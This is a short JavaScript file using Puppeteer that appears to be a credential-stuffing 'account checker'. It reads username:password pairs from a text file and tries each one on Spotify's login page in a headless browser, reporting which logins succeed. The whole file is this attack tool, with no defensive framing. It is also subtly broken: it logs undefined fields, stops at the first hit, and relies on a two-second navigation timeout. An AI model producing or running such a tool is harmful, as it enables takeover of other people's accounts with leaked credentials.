const puppeteer = require('puppeteer');
// const accounts = require('./account.json');
const fs = require('fs');

let accounts = fs.readFileSync('./account.txt', 'utf-8');

async function main() {
  accounts = accounts.split(/\r?\n/);
  let browser = await puppeteer.launch({ headless: true });
  for (let i = 0; i < accounts.length; i++) {
    let account = accounts[i];
    account = account.trim();
    account = account.split(':');
    if (account[0]) {
      const page = await browser.newPage();
      await page.setViewport({ width: 1200, height: 720 });
      await page.goto('https://accounts.spotify.com/en/login', {
        waitUntil: 'networkidle0',
      }); // wait until page load
      try {
        console.log('running account.... ' + account[0]);

        await page.evaluate(
          () => (document.getElementById('login-username').value = '')
        );
        await page.type('#login-username', account[0]);
        await page.type('#login-password', account[1]);
        // click and wait for navigation
        // await Promise.all([
        await page.click('#login-button');
        await page.waitForNavigation({
          waitUntil: 'networkidle0',
          timeout: 2000,
        });
        console.log(
          'account successfully: ',
          account.username + '|' + account.password
        );
        return;
      } catch (error) {
        continue;
      } finally {
        await page.close();
      }
    }
  }
  await browser.close();

}

main();
